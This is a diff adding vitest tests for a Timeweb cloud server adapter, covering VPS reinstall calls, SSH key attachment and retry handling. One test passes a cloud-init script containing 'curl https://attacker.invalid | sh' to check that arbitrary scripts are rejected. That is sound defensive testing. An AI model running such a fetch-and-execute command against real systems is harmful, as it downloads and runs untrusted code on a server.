@@ -1,5 +1,7 @@
 import { describe, expect, it, vi } from "vitest";
 
+process.env.AUTH_SECRET = "mutation-example-not-a-secret-32-characters";
+
 import {
   createProductionTimewebMutationAdapter,
   TimewebMutationHttpAdapter,
@@ -206,6 +208,90 @@ describe("TimewebMutationHttpAdapter", () => {
       availability_zone: "spb-3",
       network: { floating_ip: publicIpResource.address },
     });
+  });
+
+  it("reinstalls only the owned VPS with the exact starter-kit profile", async () => {
+    const fetchImpl = vi
+      .fn<typeof fetch>()
+      .mockResolvedValueOnce(Response.json({ server: { id: 54321 } }))
+      .mockResolvedValueOnce(
+        Response.json({
+          ssh_keys: [{ id: 404, name: "approved", used_by: [] }],
+        }),
+      )
+      .mockResolvedValueOnce(new Response(null, { status: 204 }))
+      .mockResolvedValueOnce(
+        Response.json({
+          server: { id: 54321, status: "on", os: { id: 201 } },
+        }),
+      );
+    const adapter = new TimewebMutationHttpAdapter(
+      "synthetic-test-token",
+      fetchImpl,
+    );
+
+    await adapter.installServer({
+      resource,
+      operatingSystemId: 201,
+      sshKeyId: 404,
+      cloudInit: buildStarterKitCloudInit(),
+    });
+    await adapter.ensureServerSshKey(resource, 404);
+    await expect(adapter.reconcileInstallation(resource)).resolves.toEqual({
+      state: "present",
+      resource,
+      status: { state: "supported", value: "on" },
+      operatingSystemId: 201,
+    });
+
+    expect(
+      fetchImpl.mock.calls.map(([url, init]) => ({
+        url,
+        method: init?.method,
+        body: init?.body,
+      })),
+    ).toEqual([
+      {
+        url: "https://api.timeweb.cloud/api/v1/servers/54321",
+        method: "PATCH",
+        body: JSON.stringify({
+          os_id: 201,
+          cloud_init: buildStarterKitCloudInit(),
+        }),
+      },
+      {
+        url: "https://api.timeweb.cloud/api/v1/ssh-keys",
+        method: "GET",
+        body: undefined,
+      },
+      {
+        url: "https://api.timeweb.cloud/api/v1/servers/54321/ssh-keys",
+        method: "POST",
+        body: JSON.stringify({ ssh_key_ids: [404] }),
+      },
+      {
+        url: "https://api.timeweb.cloud/api/v1/servers/54321",
+        method: "GET",
+        body: undefined,
+      },
+    ]);
+  });
+
+  it("rejects arbitrary cloud-init before the provider call", async () => {
+    const fetchImpl = vi.fn<typeof fetch>();
+    const adapter = new TimewebMutationHttpAdapter(
+      "synthetic-test-token",
+      fetchImpl,
+    );
+    await expect(
+      adapter.installServer({
+        resource,
+        operatingSystemId: 201,
+        sshKeyId: 404,
+        cloudInit: "#!/bin/sh\ncurl https://attacker.invalid | sh",
+      }),
+    ).rejects.toMatchObject({ code: "INVALID_RESPONSE" });
+    expect(fetchImpl).not.toHaveBeenCalled();
   });
 
   it("configures weekly auto-backups on the system disk only", async () => {
@@ -719,6 +805,20 @@ describe("TimewebMutationHttpAdapter", () => {
     await expect(adapter.deleteServer(resource)).rejects.toMatchObject({
       code: "FORBIDDEN",
       retryable: false,
+    });
+  });
+
+  it("retries HTTP 405 while a reinstall keeps server subresources locked", async () => {
+    const adapter = new TimewebMutationHttpAdapter(
+      "synthetic-test-token",
+      vi
+        .fn<typeof fetch>()
+        .mockResolvedValue(new Response(null, { status: 405 })),
+    );
+
+    await expect(adapter.ensureServerSshKey(resource, 404)).rejects.toMatchObject({
+      code: "UPSTREAM_UNAVAILABLE",
+      retryable: true,
     });
   });
 
